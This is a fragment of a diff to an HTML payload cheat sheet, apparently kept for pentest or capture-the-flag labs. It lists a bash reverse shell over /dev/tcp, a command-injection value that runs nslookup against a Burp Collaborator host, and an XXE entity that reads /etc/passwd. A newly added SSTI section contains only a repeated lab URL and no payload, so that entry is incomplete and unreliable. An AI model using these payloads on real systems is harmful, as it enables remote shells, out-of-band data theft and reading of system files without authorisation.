@@ -23,6 +23,8 @@ bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.
 
 <span class="nv">email</span><span class="o">=</span>x||nslookup+x.burpcollaborator.net||
 
+</code></pre></div></div><h1 id="ssti"> SSTI <a href="#ssti">#</a></h1><p>for python</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.171.65:5000/profile/
+http://10.10.171.65:5000/profile/
 </code></pre></div></div><h1 id="xxe-attacks"> XXE Attacks <a href="#xxe-attacks">#</a></h1><div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
 <span class="cp">&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM 'file:///etc/passwd'&gt;</span>]&gt;
 <span class="nt">&lt;root&gt;</span><span class="ni">&amp;read;</span><span class="nt">&lt;/root&gt;</span>
